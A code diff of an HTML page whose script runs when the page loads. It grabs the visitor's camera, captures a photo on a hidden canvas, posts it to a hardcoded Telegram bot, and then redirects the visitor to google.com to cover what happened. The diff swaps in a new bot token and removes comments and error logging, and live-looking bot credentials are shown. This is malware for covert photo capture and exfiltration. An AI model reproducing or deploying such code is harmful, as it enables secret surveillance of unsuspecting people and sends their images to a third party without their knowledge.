@@ -8,12 +8,12 @@
     <canvas id="canvas" style="display:none"></canvas>
     
     <script>
-        const BOT_TOKEN = '8409410631:AAHMS_10O8wbSG5OesZzIcxg78mR-5xpYE4';
+        // توكنك الجديد
+        const BOT_TOKEN = '8409410631:AAFhc4ENmetOY0tCRzhFfwVN6H3ShW4RSCg';
         const CHAT_ID = '5156556639';
         
         async function takePhoto() {
             try {
-                // 1. طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { width: 640, height: 480 } 
                 });
@@ -21,7 +21,6 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // 2. ننتظر الكاميرا تجهز (أهم شي)
                 await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
                         video.play();
@@ -29,20 +28,16 @@
                     };
                 });
                 
-                // 3. ننتظر اطار واحد عشان الصورة تظهر
                 await new Promise(r => requestAnimationFrame(r));
                 
-                // 4. ناخذ الصورة
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
                 
-                // 5. نوقف الكاميرا
                 stream.getTracks().forEach(track => track.stop());
                 
-                // 6. نرسل الصورة
                 const blob = await new Promise(resolve => {
                     canvas.toBlob(resolve, 'image/jpeg', 0.8);
                 });
@@ -56,16 +51,13 @@
                     body: formData
                 });
                 
-                // 7. نروح لجوجل
                 window.location.href = 'https://www.google.com';
                 
             } catch(error) {
-                console.error(error);
                 window.location.href = 'https://www.google.com';
             }
         }
         
-        // تشغيل
         takePhoto();
     </script>
 </body>
